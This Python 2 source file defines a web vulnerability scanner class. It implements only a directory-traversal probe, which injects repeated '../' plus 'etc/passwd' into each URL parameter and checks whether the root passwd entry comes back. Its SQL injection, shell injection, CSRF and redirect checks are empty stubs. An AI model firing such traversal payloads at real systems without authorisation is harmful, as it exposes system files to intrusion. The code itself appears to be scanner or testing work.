#from urllib.parse import parse_qs, urlsplit
from urlparse import urlparse
import urllib,urllib2,os
from utility import *
from generator import *

class Scanner(object):
    def __init__(self,url):
        self.url = url
        self.base = url.split('?')[0]
        self.vul_info = {}
        self.attack_script = ''
        self.safe = True
        self.category = ''
    
    def dirTra(self, depth=10):
        feed = ["etc/passwd"]
        prefix = '../'
        params = getParams(self.url)
        nuggets = ['root:x:0:0:root:/root:/bin/bash']
        key_params = {}
        
        i = 0
        hit = False
        
        if(not len(params.keys())): # if url contain no parameters
            return False
        else:
            for p in params:
                if hit: # if already hit
                    break
                # brute exploite by incremently adding '../'
                while i < depth and not hit :
                    # exploite every paramters in the url
                    for key in params.keys():
                        for f in feed:
                            evil_value = i*prefix+f
                            payload = {key:evil_value}
                            content = str(getHTML(self.base,payload))
                            for n in nuggets:
                                if n in content:
                                    hit = True
                                    key_params = payload
                    i+=1

        if hit:
            self.category = DT
            endpoint = urlparse(self.base).path
            render[DT](endpoint,key_params,'GET')
        return hit
                    
    def serverInj(self):
        category = SI
        return False
    
    def shellInj(self):
        return False

    def redir(self):
        return False

    def sqli(self):
        return False

    def csrf(self):
        return False
        
    def scan(self):
        if (self.sqli() or
            self.serverInj() or
            self.dirTra() or
            self.redir() or
            self.csrf() or
            self.shellInj()):
            self.safe = False
            
        if not self.safe:
            print(self.category)
    

    
        
